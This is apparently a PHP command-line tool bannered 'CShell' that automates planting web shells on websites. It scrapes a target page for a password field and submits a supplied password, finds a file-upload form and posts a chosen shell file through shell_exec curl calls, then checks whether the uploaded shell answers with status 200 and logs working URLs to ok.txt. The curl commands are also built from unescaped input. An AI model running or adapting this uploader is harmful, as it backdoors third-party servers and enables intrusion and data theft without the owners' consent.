<?php
class Main {
public $green = "\e[92m"; public $red = "\e[91m"; public $normal = "\e[0m";public $line = "\n===================================\n";

public $banner = '
_________   _________.__           .__  .__   
\_   ___ \ /   _____/|  |__   ____ |  | |  |  
/    \  \/ \_____  \ |  |  \_/ __ \|  | |  |  
\     \____/        \|   Y  \  ___/|  |_|  |__
 \______  /_______  /|___|  /\___  >____/____/
        \/        \/      \/     \/           
';

public function save($url) {
	$save = @fopen("ok.txt", "a");
	fwrite($save, $url."\n");
	fclose($save);
}

public function code($url) {
	$ch   = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	$p = curl_exec($ch);
	$httpcode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	return $httpcode;
}

public function check_password($url, $pw) {
$str = file_get_contents($url);
$doc = new DOMDocument;
@$doc->loadHTML($str);
$xpath = new DOMXpath($doc);
$pas = $xpath->query('//input[@type=\'password\']');
$pass = $pas->item(0);
if($pass->getAttribute('name')) {
	$data =  '"'.$pass->getAttribute('name').'='.$pw.'"';
	shell_exec('curl --cookie-jar 0x5151.cookies -s -X POST -d '.$data.' '.$url);
	$x = true;
}else{
	$x = false;
}
return $x;
}

public function get_param($site, $shell) {
	shell_exec('curl -s --cookie 0x5151.cookies '.$site.' >> 0x5151.tmp');
	$str = @file_get_contents("0x5151.tmp");
	$doc = new DOMDocument;
	@$doc->loadHTML($str);
	$xpath = new DOMXpath($doc);
	foreach($xpath->query('//form[@enctype=\'multipart/form-data\']//input') as $eInput) {
		$res .= $eInput->getAttribute('type').'|'.$eInput->getAttribute('name').'|'.$eInput->getAttribute('value')."\n";
	}
if(preg_match_all('/radio\|(.*)\|(.*)/', $res, $match)) {
	echo "{$this->green}[INFO]{$this->normal} Radio Found !\n";
	echo "{$this->green}[?]{$this->normal} Select Value Radio For ", $match[1][1], " \n";
for ($i = 0; $i < count($match[2]); $i++) {
    echo $i, ". ", $match[2][$i], "\n";
}
echo "{$this->green}[SELECT]{$this->normal} >> ";
$radio = trim(fgets(STDIN));
$param[] = $match[1][1].'='.$match[2][$radio];
}
if(preg_match_all('/file\|(.*)\|/', $res, $match)) {
   $param[] = $match[1][0].'=@'.$shell;
}
if(preg_match_all('/submit\|(.*)\|(.*)/', $res, $match)) {
    $param[] = $match[1][0].'='.$match[2][0];
}
for ($i = 0; $i < count($param); $i++) {
       $x .= " -F '".$param[$i]."'";
 }
return $x;
}

public function upload($x, $y, $z){
unlink("0x5151.tmp");
unlink("0x5151.cookies");
	if(empty($z)) {
		shell_exec('curl -s'.$this->get_param($x, $y).' '.$x);
	}else{
		if($this->check_password($x, $z)) {
			shell_exec('curl --cookie 0x5151.cookies -s'.$this->get_param($x, $y).' '.$x);
			}else{
				shell_exec('curl -s'.$this->get_param($x, $y).' '.$x);
			}
	}
}

public function check($site, $new){
	$curdir = dirname($site, 1).'/'.$new;
	$h = parse_url($site);
	$root = $h['scheme'].'://'.$h['host'].'/'.$new;
	if ($this->code($curdir) == '200') {
		$url = $curdir;
		$msg = "{$this->green}[OK]{$this->normal} Status Code -> {$this->green}200{$this->normal}";
		$this->save($url);
        }else{
        if ($this->code($root) == '200') {
		$url = $root;
		$msg = "{$this->green}[OK]{$this->normal} Status Code -> {$this->green}200{$this->normal}";
		$this->save($url);
		}else{
			$msg = "{$this->red}[ERROR]{$this->normal} Status Code ->{$this->green} $httpcode {$this->normal}";
		}
}
return $url."\n".$msg;
}
}
